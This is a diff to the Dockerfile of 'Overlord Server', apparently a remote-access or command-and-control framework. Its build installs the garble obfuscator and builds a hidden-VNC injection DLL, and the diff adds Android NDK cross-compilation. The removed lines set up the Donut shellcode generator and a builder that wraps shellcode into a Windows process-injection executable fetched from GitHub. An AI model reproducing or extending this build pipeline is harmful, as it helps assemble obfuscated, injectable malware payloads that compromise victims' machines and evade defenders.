@@ -1,3 +1,4 @@
+# syntax=docker/dockerfile:1.7
 # Overlord Server Dockerfile
 FROM oven/bun:1 AS base
 WORKDIR /app
@@ -11,19 +12,17 @@ RUN apt-get update \
     musl-tools \
     gcc-aarch64-linux-gnu \
     gcc-arm-linux-gnueabihf \
-    make \
-    default-jdk \
-    openssl \
-    curl \
-    ca-certificates \
-    wget \
-    git \
-    unzip \
-    upx-ucl \
+       openssl \
+       curl \
+       ca-certificates \
+       wget \
+       git \
+       unzip \
+       upx-ucl \
     && rm -rf /var/lib/apt/lists/*
 
 # Install Go (latest stable version)
-ENV GO_VERSION=1.26.1
+ENV GO_VERSION=1.26.2
 ARG TARGETARCH
 RUN case "${TARGETARCH}" in \
         amd64) GO_ARCH=amd64 ;; \
@@ -45,8 +44,20 @@ RUN --mount=type=cache,target=/root/.cache/go-build \
     --mount=type=cache,target=/go/pkg/mod \
     go install mvdan.cc/garble@latest
 
+# Install Android NDK for Android cross-compilation
+ENV ANDROID_NDK_VERSION=r27c
+ENV ANDROID_NDK_HOME=/opt/android-ndk
+RUN case "${TARGETARCH}" in \
+        amd64) NDK_HOST="linux-x86_64" ;; \
+        arm64) NDK_HOST="linux-aarch64" ;; \
+        *) echo "Unsupported architecture for Android NDK: ${TARGETARCH}" >&2; exit 1 ;; \
+    esac \
+    && wget -q "https://dl.google.com/android/repository/android-ndk-${ANDROID_NDK_VERSION}-linux.zip" \
+    && unzip -q android-ndk-${ANDROID_NDK_VERSION}-linux.zip \
+    && mv android-ndk-${ANDROID_NDK_VERSION} ${ANDROID_NDK_HOME} \
+    && rm android-ndk-${ANDROID_NDK_VERSION}-linux.zip
 
-# Copy package files and lockfile
+# Copy package file only (no lockfile — avoid version mismatch with Docker bun)
 COPY Overlord-Server/package.json ./
 
 # Install dependencies
@@ -69,39 +80,6 @@ RUN if [ -f dist-clients/HVNCInjection.x64.dll ]; then \
       HVNC_SRC_DIR=HVNCInjection/src HVNC_OUT_DIR=dist-clients bash build-hvnc-dll.sh || \
       echo "WARNING: HVNCInjection DLL not available (build with MSVC on Windows)"; \
     fi
-
-# Pre-build Donut shellcode generator and cache it in data/tools/
-RUN git clone --depth 1 https://github.com/thewover/donut.git /tmp/donut-src \
-    && make -C /tmp/donut-src \
-    && mkdir -p /app/data/tools \
-    && cp /tmp/donut-src/donut /app/data/tools/donut \
-    && chmod +x /app/data/tools/donut \
-    && rm -rf /tmp/donut-src
-
-# Compile native Typhon builder tool (wraps shellcode into typhon.exe template on Linux)
-# Uses a temp Go module so it compiles in module-aware mode without a pre-existing go.mod
-RUN mkdir -p /tmp/typhon-build /app/data/tools \
-    && cp /app/src/server/typhon-builder.go /tmp/typhon-build/main.go \
-    && cd /tmp/typhon-build \
-    && go mod init typhon-build \
-    && go build -o /app/data/tools/typhon-builder . \
-    && chmod +x /app/data/tools/typhon-builder \
-    && rm -rf /tmp/typhon-build
-
-# Pre-fetch Typhon Windows PE template (typhon-builder appends shellcode to this at build time)
-RUN mkdir -p /app/data/tools \
-    && TYPHON_URL=$(curl -fsSL https://api.github.com/repos/messecv3/typhon-process-injection/releases/latest \
-        | grep -oP '"browser_download_url":\s*"\K[^"]*typhon[^"]*\.exe' | head -1) \
-    && if [ -n "$TYPHON_URL" ]; then \
-        curl -fsSL "$TYPHON_URL" -o /app/data/tools/typhon.exe \
-        && echo "Typhon template downloaded"; \
-    else \
-        git clone --depth 1 https://github.com/messecv3/typhon-process-injection.git /tmp/typhon-src \
-        && find /tmp/typhon-src -maxdepth 3 -name "typhon.exe" | head -1 \
-            | xargs -I{} cp {} /app/data/tools/typhon.exe \
-        && rm -rf /tmp/typhon-src \
-        && echo "Typhon template copied from repo"; \
-    fi || echo "WARNING: Typhon template unavailable; place typhon.exe in data/tools/ manually"
 
 # Create necessary directories
 RUN mkdir -p certs public data
